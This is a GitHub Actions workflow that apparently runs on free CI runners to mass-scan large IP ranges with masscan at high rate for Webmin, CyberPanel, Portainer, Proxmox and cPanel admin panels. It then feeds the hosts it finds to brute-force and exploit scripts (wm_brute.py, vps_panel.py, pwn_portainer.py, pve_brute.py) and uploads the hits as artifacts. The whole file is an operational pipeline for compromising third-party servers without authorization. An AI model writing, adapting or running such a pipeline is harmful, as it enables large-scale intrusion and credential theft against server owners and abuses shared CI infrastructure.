name: huge
on: workflow_dispatch
jobs:
  webmin:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      - run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
      - run: |
          python3 - <<'PY'
          import re
          src = open('wm_brute.py').read()
          pl = open('pwlist2.txt').read().split()
          src = re.sub(r"PASSWORDS = \[[^\]]*\]", "PASSWORDS = " + repr(pl), src, flags=re.S)
          open('wm_brute.py','w').write(src)
          print("pw:", len(pl))
          PY
      - name: scan 10000
        run: |
          sudo masscan -iL cidrs_huge.txt -p10000 --rate 100000 -oL hw.txt --wait 0 || true
          awk '$1=="open"{print $4":"$3}' hw.txt | sort -u > huge_webmin.txt
          echo "=== webmin hosts: $(wc -l < huge_webmin.txt) ==="
      - name: sweep
        run: python3 wm_brute.py huge_webmin.txt || true
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: huge-webmin
          path: |
            /tmp/wm_brute_hits.json
            huge_webmin.txt
          if-no-files-found: warn
  cyber:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      - run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
      - name: scan 8090
        run: |
          sudo masscan -iL cidrs_huge.txt -p8090 --rate 100000 -oL hc.txt --wait 0 || true
          awk '$1=="open"{print $4":"$3}' hc.txt | sort -u > huge_cp.txt
          echo "=== cyberpanel hosts: $(wc -l < huge_cp.txt) ==="
      - name: exploit
        run: |
          python3 vps_panel.py huge_cp.txt || true
          grep -o '"host": "[^"]*"' /tmp/vps_panel_hits.jsonl 2>/dev/null | cut -d'"' -f4 > huge_cp_hits.txt || true
          wc -l huge_cp_hits.txt || true
          python3 cp_verify.py huge_cp_hits.txt || true
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: huge-cyber
          path: |
            /tmp/vps_panel_result.json
            huge_cp.txt
          if-no-files-found: warn
  panels:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      - run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
      - name: scan panels
        run: |
          sudo masscan -iL cidrs_huge.txt -p9000,9443,8006,2087 --rate 100000 -oL hp.txt --wait 0 || true
          awk '$1=="open"{print $4":"$3}' hp.txt | sort -u > huge_panels.txt
          echo "=== panel hosts: $(wc -l < huge_panels.txt) ==="
          awk -F: '{print $2}' huge_panels.txt | sort | uniq -c
      - name: portainer
        run: |
          grep -E ':(9000|9443)$' huge_panels.txt > hp_portainer.txt || true
          echo "portainer: $(wc -l < hp_portainer.txt)"
          python3 pwn_portainer.py hp_portainer.txt || true
      - name: proxmox
        run: |
          grep -E ':8006$' huge_panels.txt > hp_pve.txt || true
          echo "proxmox: $(wc -l < hp_pve.txt)"
          head -60000 hp_pve.txt > hp_pve_s.txt
          python3 pve_brute.py hp_pve_s.txt || true
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: huge-panels
          path: |
            /tmp/portainer_result.json
            /tmp/pve_result.json
            huge_panels.txt
          if-no-files-found: warn
